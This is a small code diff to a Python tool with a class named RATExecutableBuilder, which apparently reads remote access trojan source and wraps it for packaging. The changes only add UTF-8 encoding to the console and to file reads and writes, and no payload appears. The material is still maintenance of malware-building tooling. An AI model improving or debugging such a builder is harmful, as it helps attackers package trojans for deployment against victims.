@@ -30,6 +30,11 @@ import hashlib
 import random
 import string
 
+# Fix encoding for Windows console
+if sys.platform == 'win32':
+    import io
+    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+
 # ═══════════════════════════════════════════════════════════════════════════════
 # COLORS & STYLING
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -162,7 +167,7 @@ class RATExecutableBuilder:
     def read_rat_source(self):
         """Read RAT source code"""
         try:
-            with open(self.rat_source, 'r') as f:
+            with open(self.rat_source, 'r', encoding='utf-8') as f:
                 code = f.read()
             self.log("success", f"Read RAT source: {len(code)} bytes")
             return code
@@ -334,7 +339,7 @@ if __name__ == "__main__":
         
         # Save wrapper
         wrapper_path = os.path.join(self.work_dir, f"{self.output_name}_wrapped.py")
-        with open(wrapper_path, 'w') as f:
+        with open(wrapper_path, 'w', encoding='utf-8') as f:
             f.write(wrapped)
         self.log("success", f"Wrapper saved: {wrapper_path}")
         
